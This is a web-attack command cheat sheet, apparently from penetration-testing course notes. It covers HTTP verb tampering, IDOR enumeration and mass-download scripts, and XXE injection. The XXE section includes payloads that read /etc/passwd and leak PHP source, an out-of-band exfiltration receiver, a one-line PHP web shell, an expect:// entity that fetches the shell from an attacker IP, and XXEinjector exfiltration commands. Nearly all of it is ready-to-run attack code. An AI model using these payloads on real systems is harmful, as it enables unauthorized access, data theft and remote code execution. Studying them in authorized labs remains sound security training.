# Web Attacks Command Cheat Sheet

## HTTP Verb Tampering

### Testing HTTP Methods
```bash
# Check supported HTTP methods
curl -i -X OPTIONS http://SERVER_IP:PORT/

# Test different HTTP methods
curl -X HEAD http://SERVER_IP:PORT/admin/reset.php
curl -X PUT http://SERVER_IP:PORT/admin/reset.php
curl -X DELETE http://SERVER_IP:PORT/admin/reset.php
```

## IDOR (Insecure Direct Object References)

### Basic IDOR Testing
```bash
# Extract document links with grep
curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"

# Mass enumeration script
for i in {1..10}; do
    for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
        wget -q $url/$link
    done
done
```

### Hash Calculation for Encoded References
```bash
# MD5 hash calculation
echo -n 1 | md5sum

# Base64 encode then MD5 hash
echo -n 1 | base64 -w 0 | md5sum

# Remove trailing characters
echo -n 1 | base64 -w 0 | md5sum | tr -d ' -'

# Loop for multiple IDs
for i in {1..10}; do
    echo -n $i | base64 -w 0 | md5sum | tr -d ' -';
done
```

### Mass Download Script for Encoded References
```bash
#!/bin/bash
for i in {1..10}; do
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
    done
done
```

## XXE (XML External Entity) Injection

### Basic Local File Disclosure
```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```

### PHP Filter for Source Code
```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

### CDATA Method with External DTD
```bash
# Create external DTD file
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd

# Start HTTP server
python3 -m http.server 8000
```

### Out-of-Band (OOB) Exfiltration Server
```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

```bash
# Start PHP server for OOB
php -S 0.0.0.0:8000
```

### Remote Code Execution Setup
```bash
# Create web shell
echo '<?php system($_REQUEST["cmd"]);?>' > shell.php

# Start HTTP server
sudo python3 -m http.server 80
```

### XXE Expect Module (RCE)
```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
```

### Automated XXE with XXEinjector
```bash
# Clone tool
git clone https://github.com/enjoiz/XXEinjector.git

# Run automated OOB exfiltration
ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
```

## General Testing Commands

### Burp Suite Integration
- Use "Change Request Method" in Burp Suite for HTTP verb tampering
- Use Burp Intruder for mass enumeration
- Use Burp Comparer for hash comparison

### File Analysis
```bash
# View downloaded contracts
ls -1 contract_*.pdf

# Check logs from XXEinjector
cat Logs/IP_ADDRESS/etc/passwd.log
```
